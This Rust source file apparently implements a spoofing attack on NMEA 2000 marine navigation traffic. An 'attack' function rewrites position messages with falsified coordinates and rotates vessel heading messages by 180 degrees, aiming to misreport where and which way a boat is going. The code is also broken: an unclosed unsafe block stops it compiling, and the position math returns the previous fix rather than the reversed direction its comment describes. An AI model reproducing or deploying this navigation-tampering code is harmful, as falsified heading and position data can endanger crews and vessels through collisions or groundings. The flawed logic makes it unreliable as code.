use crate::NMEAMsg;
static mut LAST_LAT: i32 = 0;
static mut LAST_LON: i32 = 0;

//only here temp. will be deleted after
extern "C" {

    // Prints a char array as a string. Used for debugging purposes.
    #[link_name = "PrintStr"]
    pub fn PrintStr(input: *const u8, length: i32);

    // Prints an integer. Used for debugging purposes.
    #[link_name = "PrintInt32"]
    pub fn PrintInt32(input: i32, hex: i32);
}

/// Modifies a Position, Rapid Update message
///
/// For PGN 129025
/// Finds the difference between the current and previous latitude and longitude, and swaps the direction change. 
/// If the boat heads South West between readings, the modified message will dipict it travelling North East.
pub fn _129025(mut msg: NMEAMsg) -> NMEAMsg{

    // Latitude
    let mut lat_arr: [u8; 4] = [0; 4]; 
    lat_arr.copy_from_slice(&msg.data[0..4]);   
    let lat: i32 = i32::from_be_bytes(lat_arr); 

    // Longitude
    let mut lon_arr: [u8; 4] = [0; 4]; 
    lon_arr.copy_from_slice(&msg.data[4..8]);
    let lon: i32 = i32::from_be_bytes(lon_arr);  

    // get the differences and calculate fake coordinate in opposite direction
    let lat_diff: i32;
    let lon_diff: i32;

    unsafe {
        lat_diff = lat - LAST_LAT;
        lon_diff = lon - LAST_LON;
    }
    
    let fake_lat = lat - lat_diff;    
    let fake_lon = lon - lon_diff;

    // put fake data into messages
    let lat_bytes: [u8; 4] = fake_lat.to_be_bytes();
    msg.data[0..4].copy_from_slice(&lat_bytes);

    let lon_bytes: [u8; 4] = fake_lon.to_be_bytes();
    msg.data[4..8].copy_from_slice(&lon_bytes);
    
    unsafe {
        LAST_LAT = lat;
        LAST_LON = lon;  
    }


    return msg;
}

/// Modifies a Vessel Heading message
///
/// For PGN 127250
/// Changes the heading by 180 degrees
pub fn _127250(mut msg: NMEAMsg) -> NMEAMsg{
    unsafe{
    // Extract the heading data
    let heading_bytes: [u8; 2] = [msg.data[1], msg.data[2]];;
    let original_hdg: u16 = u16::from_le_bytes(heading_bytes);

    // Modify the heading by adding 3.1415 radians and wrapping
    let modified_hdg = (original_hdg + (std::f32::consts::PI * 65536.0 / (2.0 * std::f32::consts::PI)) as u16); // as u16 provides wrapping behaviour so we don't need to include % 65536

    // Convert the modified heading back to bytes
    let modified_hdg_bytes: [u8; 2] = modified_hdg.to_le_bytes();

    // Update the msg.data array with the modified heading
    msg.data[1..3].copy_from_slice(&modified_hdg_bytes);

    return msg;
}

/// Modifies a message if it contains positional data
pub fn attack(msg: NMEAMsg) -> NMEAMsg{

    let modified_msg;

    modified_msg = match msg.pgn {
        127250 => _127250(msg),
        129025 =>  _129025(msg),
        _ => msg,
    };

    return modified_msg;
}


